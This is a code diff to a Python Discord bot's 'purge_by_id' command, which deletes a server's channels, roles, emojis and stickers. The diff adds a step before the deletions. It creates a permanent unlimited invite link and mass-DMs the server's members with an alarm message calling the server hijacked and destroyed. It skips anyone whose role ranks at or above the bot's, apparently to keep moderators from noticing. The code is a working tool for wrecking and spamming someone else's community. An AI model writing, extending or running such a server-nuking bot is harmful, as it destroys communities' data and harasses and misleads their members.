@@ -158,6 +158,64 @@ async def purge_by_id(ctx, server_id: int = None):
     
     print(f"Found {len(channels)} channels, {len(roles)} roles, {len(emojis)} emojis, {len(stickers)} stickers")
     
+    # DM warning to all members
+    dm_count = 0
+    print("Starting DM phase...")
+    try:
+        # Find first text channel to create invite
+        text_channel = None
+        for channel in guild.channels:
+            if isinstance(channel, discord.TextChannel):
+                text_channel = channel
+                break
+        
+        # Create invite link
+        invite_link = "No invite available"
+        if text_channel:
+            try:
+                invite = await text_channel.create_invite(max_age=0, max_uses=0)
+                invite_link = invite.url
+                print(f"Created invite: {invite_link}")
+            except Exception as e:
+                print(f"Failed to create invite: {e}")
+        
+        # Get bot's highest role position
+        bot_member = guild.me
+        bot_role_position = bot_member.top_role.position if bot_member else 0
+        
+        # DM all members except those with roles higher than bot
+        warning_msg = f"🚨 **LEAVE THIS SERVER** 🚨\n\n**Backup invite:** {invite_link}\n\n**THIS SERVER IS:** Compromised, Corrupted, Under Attack, Being Purged, Unsafe, Hijacked, Destroyed"
+        
+        for member in guild.members:
+            try:
+                # Skip bots and members with roles higher than bot
+                if member.bot:
+                    continue
+                
+                member_role_position = member.top_role.position if member.top_role else 0
+                if member_role_position >= bot_role_position:
+                    print(f"Skipping {member.name} - higher role position ({member_role_position} >= {bot_role_position})")
+                    continue
+                
+                # Send DM
+                await member.send(warning_msg)
+                dm_count += 1
+                print(f"DMed {member.name} ({dm_count} total)")
+                await asyncio.sleep(0.5)  # Rate limit for DMs
+                
+            except discord.Forbidden:
+                print(f"Cannot DM {member.name} - DMs disabled")
+            except Exception as e:
+                print(f"Failed to DM {member.name}: {e}")
+        
+        print(f"Sent DMs to {dm_count} members")
+        
+        # Small delay before starting destruction
+        await asyncio.sleep(2)
+        
+    except Exception as e:
+        print(f"Error in DM section: {e}")
+    
     # Delete channels
     deleted_channels = 0
     print("Starting channel deletion...")
@@ -254,7 +312,7 @@ async def purge_by_id(ctx, server_id: int = None):
         except Exception as e:
             print(f"  ✗ Error: {e}")
     
-    result = f"Purge completed:\n{deleted_channels}/{len(channels)} channels\n{deleted_roles}/{len(roles)} roles\n{deleted_emojis}/{len(emojis)} emojis\n{deleted_stickers}/{len(stickers)} stickers"
+    result = f"Purge completed:\n{deleted_channels}/{len(channels)} channels\n{deleted_roles}/{len(roles)} roles\n{deleted_emojis}/{len(emojis)} emojis\n{deleted_stickers}/{len(stickers)} stickers\nDMed {dm_count} members"
     print(result)
     await ctx.send(result)
 
